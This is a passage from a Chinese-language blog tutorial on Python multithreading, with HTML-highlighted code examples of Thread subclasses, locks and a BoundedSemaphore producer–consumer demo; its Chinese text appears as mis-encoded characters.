class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#çº¿ç¨‹ç­‰å¾…å¯åŠ¨</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> nloops<span class="token punctuation">:</span>        threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># çº¿ç¨‹ç­‰å¾…ï¼Œä¸»çº¿ç¨‹ä¸ä¼šç­‰å¾…å­çº¿ç¨‹æ‰§è¡Œå®Œæ¯•å†ç»“æŸè‡ªèº«ï¼Œå¯ä½¿ç”¨Threadç±»çš„join()æ–¹æ³•æ¥è®©æ‰€æœ‰å­çº¿ç¨‹æ‰§è¡Œå®Œæ¯•ä»¥åï¼Œä¸»çº¿ç¨‹å†å…³é—­</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"all DONE at:"</span><span class="token punctuation">,</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200408205329302.png" alt loading="lazy"></p><p>å½“ç„¶ä»¥ä¸Šä¹Ÿå¯ä»¥åˆ›å»ºå¤šä¸ªçº¿ç¨‹ï¼Œä¸‹é¢ä½¿ç”¨å¯è°ƒç”¨çš„ç±»æ¥å®ç°ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token keyword">from</span> time <span class="token keyword">import</span> ctime<span class="token punctuation">,</span> sleeploops <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token keyword">class</span> <span class="token class-name">ThreadFunc</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> func<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>func <span class="token operator">=</span> func        self<span class="token punctuation">.</span>args <span class="token operator">=</span> args    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token comment">#é‡å†™runæ–¹æ³•,å®šä¹‰çº¿ç¨‹åŠŸèƒ½</span>        self<span class="token punctuation">.</span>func<span class="token punctuation">(</span><span class="token operator">*</span>self<span class="token punctuation">.</span>args<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">loop</span><span class="token punctuation">(</span>nloop<span class="token punctuation">,</span> nsec<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'start loop'</span><span class="token punctuation">,</span> nloop<span class="token punctuation">,</span> <span class="token string">'at :'</span><span class="token punctuation">,</span> ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span>nsec<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'loop'</span><span class="token punctuation">,</span> nloop<span class="token punctuation">,</span> <span class="token string">'done at :'</span><span class="token punctuation">,</span> ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'starting at :'</span><span class="token punctuation">,</span> ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    threads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    nloops <span class="token operator">=</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>loops<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> nloops<span class="token punctuation">:</span>        t <span class="token operator">=</span> ThreadFunc<span class="token punctuation">(</span>loop<span class="token punctuation">,</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> loops<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        threads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> nloops<span class="token punctuation">:</span>        threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> nloops<span class="token punctuation">:</span>        threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'all DONE at :'</span><span class="token punctuation">,</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>æ•ˆæœå’Œä¸Šé¢çš„ä¸€æ ·ï¼Œéšåæˆ‘ä»¬å°†å…¶åŠŸèƒ½å­˜å‚¨ä¸ºä¸€ä¸ªç‹¬ç«‹çš„æ¨¡å—ï¼ˆmyThread.pyï¼‰ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token keyword">from</span> time <span class="token keyword">import</span> ctime<span class="token keyword">class</span> <span class="token class-name">MyThread</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>func<span class="token punctuation">,</span>args<span class="token punctuation">,</span>name <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>func <span class="token operator">=</span> func        self<span class="token punctuation">.</span>args <span class="token operator">=</span> args    <span class="token keyword">def</span> <span class="token function">getResult</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>res  <span class="token comment">#å°†ç»“æœä¿å­˜åé€šè¿‡getResultæ–¹æ³•è·å–è¿”å›å€¼</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"starting"</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>name<span class="token punctuation">,</span> ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>res <span class="token operator">=</span> self<span class="token punctuation">.</span>func<span class="token punctuation">(</span><span class="token operator">*</span>self<span class="token punctuation">.</span>args<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token string">"finished at :"</span><span class="token punctuation">,</span> ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h3 id="æ–æ³¢é‚£å¥‘ï¼Œé˜¶ä¹˜ä¸ç´¯åŠ "><a href="#æ–æ³¢é‚£å¥‘ï¼Œé˜¶ä¹˜ä¸ç´¯åŠ " class="headerlink" title="æ–æ³¢é‚£å¥‘ï¼Œé˜¶ä¹˜ä¸ç´¯åŠ "></a>æ–æ³¢é‚£å¥‘ï¼Œé˜¶ä¹˜ä¸ç´¯åŠ </h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> myThread <span class="token keyword">import</span> MyThread<span class="token keyword">from</span> time <span class="token keyword">import</span> ctime<span class="token punctuation">,</span> sleep<span class="token keyword">def</span> <span class="token function">Fib</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    sleep<span class="token punctuation">(</span><span class="token number">0.005</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> x <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>Fib<span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> Fib<span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Fac</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> x <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>x <span class="token operator">*</span> Fac<span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Sum</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> x <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>x <span class="token operator">+</span> Sum<span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>funcs <span class="token operator">=</span> <span class="token punctuation">[</span>Fib<span class="token punctuation">,</span> Fac<span class="token punctuation">,</span> Sum<span class="token punctuation">]</span>n <span class="token operator">=</span> <span class="token number">8</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    nfuncs <span class="token operator">=</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>funcs<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> nfuncs<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"starting"</span><span class="token punctuation">,</span> funcs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>__name__<span class="token punctuation">,</span> <span class="token string">"at :"</span><span class="token punctuation">,</span> ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>funcs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>funcs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>__name__<span class="token punctuation">,</span> <span class="token string">"finished at :"</span><span class="token punctuation">,</span> ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n *** MULTIPLE THREADS"</span><span class="token punctuation">)</span>    threads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> nfuncs<span class="token punctuation">:</span>        t <span class="token operator">=</span> MyThread<span class="token punctuation">(</span>funcs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>n<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">,</span> funcs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>__name__<span class="token punctuation">)</span>        threads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> nfuncs<span class="token punctuation">:</span>        threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> nfuncs<span class="token punctuation">:</span>        threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>getResult<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"all DONE"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼Œå¯è§å¤šçº¿ç¨‹å¤„ç†çš„æ•ˆæœ</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200410104130911.png" alt loading="lazy"></p><h3 id="é”ç¤ºä¾‹"><a href="#é”ç¤ºä¾‹" class="headerlink" title="é”ç¤ºä¾‹"></a>é”ç¤ºä¾‹</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> atexit <span class="token keyword">import</span> register<span class="token keyword">from</span> random <span class="token keyword">import</span> randrange<span class="token keyword">from</span> threading <span class="token keyword">import</span> Thread <span class="token punctuation">,</span> Lock<span class="token punctuation">,</span> current_thread<span class="token keyword">from</span> time <span class="token keyword">import</span> ctime<span class="token punctuation">,</span> sleep<span class="token keyword">class</span> <span class="token class-name">CleanOutputSet</span><span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__str__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment">#å½“ä½¿ç”¨printè¾“å‡ºå¯¹è±¡çš„æ—¶å€™ï¼Œè‹¥å®šä¹‰äº†__str__(self)æ–¹æ³•ï¼Œæ‰“å°å¯¹è±¡æ—¶å°±ä¼šä»è¿™ä¸ªæ–¹æ³•ä¸­æ‰“å°å‡ºreturnçš„å­—ç¬¦ä¸²æ•°æ®</span>        <span class="token keyword">return</span> <span class="token string">", "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> self<span class="token punctuation">)</span><span class="token comment">#è¡¨ç¤ºå°†selfä¸­æ¯ä¸ªå…ƒç´ ï¼ˆé™¤æœ€åä¸€ä¸ªï¼‰ååŠ ä¸Š, åˆ†ç¦»å½¢æˆå­—ç¬¦ä¸²åè¿”å›</span>lock <span class="token operator">=</span> Lock<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">#åˆ›å»ºä¸€ä¸ªé”å¯¹è±¡</span>loops <span class="token operator">=</span> <span class="token punctuation">(</span>randrange<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>randrange<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#æ­¤è¡Œè¡¨ç¤ºéšæœºé€‰å–2-5çš„æ•°å­—éšæœºé€‰3-7æ¬¡</span>remaining <span class="token operator">=</span> CleanOutputSet<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">loop</span><span class="token punctuation">(</span>nsec<span class="token punctuation">)</span><span class="token punctuation">:</span>    myname <span class="token operator">=</span> current_thread<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>name  <span class="token comment">#è¿”å›å½“å‰Threadå¯¹è±¡çš„åå­—</span>    lock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>          <span class="token comment">#åŠ é”</span>    remaining<span class="token punctuation">.</span>add<span class="token punctuation">(</span>myname<span class="token punctuation">)</span>   <span class="token comment">#addæ–¹æ³•ï¼Œå¦‚æœä¸åœ¨é›†åˆä¸­åˆ™æ·»åŠ </span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[&#123;&#125;] Started &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>myname<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#print("    (remaining: &#123;&#125;)".format(remaining or "NONE"))</span>    lock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>          <span class="token comment">#é‡Šæ”¾</span>    sleep<span class="token punctuation">(</span>nsec<span class="token punctuation">)</span>    lock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>    remaining<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>myname<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[&#123;&#125;] Competed &#123;&#125; (&#123;&#125; secs)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>myname<span class="token punctuation">,</span>nsec<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"    (remaining: &#123;&#125;)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>remaining <span class="token keyword">or</span> <span class="token string">"NONE"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    lock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> pause <span class="token keyword">in</span> loops<span class="token punctuation">:</span>        Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>loop<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>pause<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@register</span>   <span class="token comment">#é€šè¿‡è£…é¥°å™¨ä½¿ç”¨register,atexitæ¨¡å—ä½¿ç”¨registerå‡½æ•°ç”¨äºåœ¨ python è§£é‡Šå™¨ä¸­æ³¨å†Œä¸€ä¸ªé€€å‡ºå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°åœ¨è§£é‡Šå™¨æ­£å¸¸ç»ˆæ­¢æ—¶è‡ªåŠ¨æ‰§è¡Œ</span><span class="token keyword">def</span> <span class="token function">_atexit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"all DONE at :&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>è¾“å‡ºç»“æœä¹‹ä¸€å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200410215119133.png" alt loading="lazy"></p><p>I/Oå’Œè®¿é—®ç›¸åŒçš„æ•°æ®ç»“æ„éƒ½å±äºä¸´ç•ŒåŒºï¼Œå› æ­¤éœ€è¦å¤šä¸ªé”æ¥é˜²æ­¢å¤šä¸ªçº¿ç¨‹åŒæ—¶è¿›å…¥ä¸´ç•ŒåŒº</p><h3 id="ä¿¡å·é‡ç¤ºä¾‹"><a href="#ä¿¡å·é‡ç¤ºä¾‹" class="headerlink" title="ä¿¡å·é‡ç¤ºä¾‹"></a>ä¿¡å·é‡ç¤ºä¾‹</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> atexit <span class="token keyword">import</span> register<span class="token keyword">from</span> random <span class="token keyword">import</span> randrange<span class="token keyword">from</span> threading <span class="token keyword">import</span> BoundedSemaphore<span class="token punctuation">,</span> Lock<span class="token punctuation">,</span> Thread<span class="token keyword">from</span> time <span class="token keyword">import</span> ctime<span class="token punctuation">,</span> sleeplock <span class="token operator">=</span> Lock<span class="token punctuation">(</span><span class="token punctuation">)</span>MAX <span class="token operator">=</span> <span class="token number">5</span>candytray <span class="token operator">=</span> BoundedSemaphore<span class="token punctuation">(</span>MAX<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">refill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    lock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Refilling candy..."</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        candytray<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">#é‡Šæ”¾ä¿¡å·é‡ï¼Œä½¿å†…éƒ¨è®¡æ•°å™¨å¢åŠ ä¸€ï¼Œå¯ä»¥å”¤é†’ç­‰å¾…çš„çº¿ç¨‹</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"full, skipping"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"OK  "</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Remaining :&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>candytray<span class="token punctuation">.</span>_value<span class="token punctuation">)</span><span class="token punctuation">)</span>    lock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">buy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    lock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Buying candy..."</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> candytray<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token comment"># è·å–ä¸€ä¸ªä¿¡å·é‡ï¼Œå¦‚æœå†…éƒ¨è®¡æ•°å™¨å¤§äºé›¶ï¼Œåˆ™å°†å…¶å‡ä¸€å¹¶ç«‹å³è¿”å›Trueã€‚å¦‚æœä¸ºé›¶ï¼Œè¿”å›False</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"OK  "</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Remaining :&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>candytray<span class="token punctuation">.</span>_value<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"empty, skipping"</span><span class="token punctuation">)</span>    lock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">producer</span><span class="token punctuation">(</span>loops<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>loops<span class="token punctuation">)</span><span class="token punctuation">:</span>        refill<span class="token punctuation">(</span><span class="token punctuation">)</span>        sleep<span class="token punctuation">(</span>randrange<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">consumer</span><span class="token punctuation">(</span>loops<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>loops<span class="token punctuation">)</span><span class="token punctuation">:</span>        buy<span class="token punctuation">(</span><span class="token punctuation">)</span>        sleep<span class="token punctuation">(</span>randrange<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"starting at :&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    nloops <span class="token operator">=</span> randrange<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"THE CANDY MACHINE (full with &#123;&#125;)!"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>MAX<span class="token punctuation">)</span><span class="token punctuation">)</span>    Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>consumer<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>randrange<span class="token punctuation">(</span>nloops<span class="token punctuation">,</span> nloops <span class="token operator">+</span> MAX <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>producer<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>nloops<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@register</span><span class="token keyword">def</span> <span class="token function">_atexit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"all DONE at :&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><code>acquire(blocking=å¸ƒå°”å€¼,timeout=None)</code></p><ul><li>æœ¬æ–¹æ³•ç”¨äºè·å¾—Semaphore</li><li>blockingé»˜è®¤å€¼æ˜¯Trueï¼Œæ­¤æ—¶ï¼Œå¦‚æœå†…éƒ¨è®¡æ•°å™¨å€¼å¤§äº0ï¼Œåˆ™å‡ä¸€ï¼Œå¹¶è¿”å›ï¼›å¦‚æœç­‰äº0ï¼Œåˆ™é˜»å¡ï¼Œç­‰å¾…å…¶ä»–çº¿ç¨‹è°ƒç”¨release()ä»¥ä½¿è®¡æ•°å™¨åŠ 1ï¼›æœ¬æ–¹æ³•è¿”å›Trueï¼Œæˆ–æ— 